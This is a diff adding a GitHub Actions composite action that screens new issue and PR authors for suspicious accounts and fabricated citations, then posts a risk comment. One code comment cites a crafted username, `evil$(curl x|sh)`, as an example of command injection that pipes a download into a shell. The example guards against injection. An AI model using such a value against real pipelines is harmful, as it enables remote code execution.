@@ -1,0 +1,107 @@
+name: "Contributor Check"
+description: >
+  Screens the author of a new issue/PR for account-shape anomalies and
+  fabricated DOI/CVE/repo citations before a human reads it. First-pass
+  filter only — does not replace maintainer judgment on cross-repo
+  coordination patterns.
+
+inputs:
+  github-token:
+    description: "GitHub token with issues:write and pull-requests:write"
+    required: true
+  risk-threshold:
+    description: "Minimum overall risk to post a comment: LOW, MEDIUM, or HIGH"
+    required: false
+    default: "MEDIUM"
+
+outputs:
+  risk:
+    description: "Overall risk level: LOW, MEDIUM, or HIGH"
+    value: ${{ steps.run.outputs.risk }}
+  profile-risk:
+    value: ${{ steps.run.outputs.profile-risk }}
+  credential-risk:
+    value: ${{ steps.run.outputs.credential-risk }}
+
+runs:
+  using: "composite"
+  steps:
+    - name: Setup Python
+      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
+      with:
+        python-version: "3.12"
+
+    - name: Resolve inputs
+      id: inputs
+      shell: bash
+      env:
+        # Username/body are attacker-controlled on an issue/PR from an
+        # unknown author. Pass through env:, never through ${{ }}
+        # interpolation inside the shell script — a crafted username like
+        # `evil$(curl x|sh)` must arrive as a literal value, not be expanded.
+        EVENT_NAME: ${{ github.event_name }}
+        PR_USER_LOGIN: ${{ github.event.pull_request.user.login }}
+        PR_NUMBER: ${{ github.event.pull_request.number }}
+        ISSUE_USER_LOGIN: ${{ github.event.issue.user.login }}
+        ISSUE_NUMBER: ${{ github.event.issue.number }}
+        ISSUE_BODY: ${{ github.event.issue.body }}
+        PR_BODY: ${{ github.event.pull_request.body }}
+      run: |
+        if [ "$EVENT_NAME" = "pull_request_target" ] || [ "$EVENT_NAME" = "pull_request" ]; then
+          echo "username=$PR_USER_LOGIN" >> "$GITHUB_OUTPUT"
+          echo "number=$PR_NUMBER" >> "$GITHUB_OUTPUT"
+          echo "type=pr" >> "$GITHUB_OUTPUT"
+          printf '%s' "$PR_BODY" > /tmp/rcc-body.txt
+        elif [ "$EVENT_NAME" = "issues" ]; then
+          echo "username=$ISSUE_USER_LOGIN" >> "$GITHUB_OUTPUT"
+          echo "number=$ISSUE_NUMBER" >> "$GITHUB_OUTPUT"
+          echo "type=issue" >> "$GITHUB_OUTPUT"
+          printf '%s' "$ISSUE_BODY" > /tmp/rcc-body.txt
+        fi
+
+    - name: Run contributor check
+      id: run
+      shell: bash
+      env:
+        GITHUB_TOKEN: ${{ inputs.github-token }}
+        ACTION_PATH: ${{ github.action_path }}
+        STEP_USERNAME: ${{ steps.inputs.outputs.username }}
+      run: |
+        python "$ACTION_PATH/scripts/contributor_check.py" \
+          --username "$STEP_USERNAME" \
+          --body-file /tmp/rcc-body.txt \
+          --json > /tmp/rcc-report.json
+        cat /tmp/rcc-report.json
+
+        risk=$(python -c "import json; print(json.load(open('/tmp/rcc-report.json'))['overall_risk'])")
+        profile_risk=$(python -c "import json; print(json.load(open('/tmp/rcc-report.json'))['profile_risk'])")
+        cred_risk=$(python -c "import json; print(json.load(open('/tmp/rcc-report.json'))['credential_risk'])")
+        echo "risk=$risk" >> "$GITHUB_OUTPUT"
+        echo "profile-risk=$profile_risk" >> "$GITHUB_OUTPUT"
+        echo "credential-risk=$cred_risk" >> "$GITHUB_OUTPUT"
+
+        python "$ACTION_PATH/scripts/contributor_check.py" \
+          --username "$STEP_USERNAME" \
+          --body-file /tmp/rcc-body.txt > /tmp/rcc-comment.md
+
+    - name: Post comment
+      if: always()
+      shell: bash
+      env:
+        GITHUB_TOKEN: ${{ inputs.github-token }}
+        REPOSITORY: ${{ github.repository }}
+        NUMBER: ${{ steps.inputs.outputs.number }}
+        RISK: ${{ steps.run.outputs.risk }}
+        THRESHOLD: ${{ inputs.risk-threshold }}
+      run: |
+        rank() { case "$1" in LOW) echo 0;; MEDIUM) echo 1;; HIGH) echo 2;; *) echo 0;; esac; }
+        if [ "$(rank "$RISK")" -ge "$(rank "$THRESHOLD")" ]; then
+          gh api "repos/$REPOSITORY/issues/$NUMBER/comments" -f body="$(cat /tmp/rcc-comment.md)"
+        else
+          echo "Risk $RISK below threshold $THRESHOLD — no comment posted."
+        fi
+
+    - name: Cleanup
+      if: always()
+      shell: bash
+      run: rm -f /tmp/rcc-body.txt /tmp/rcc-report.json /tmp/rcc-comment.md
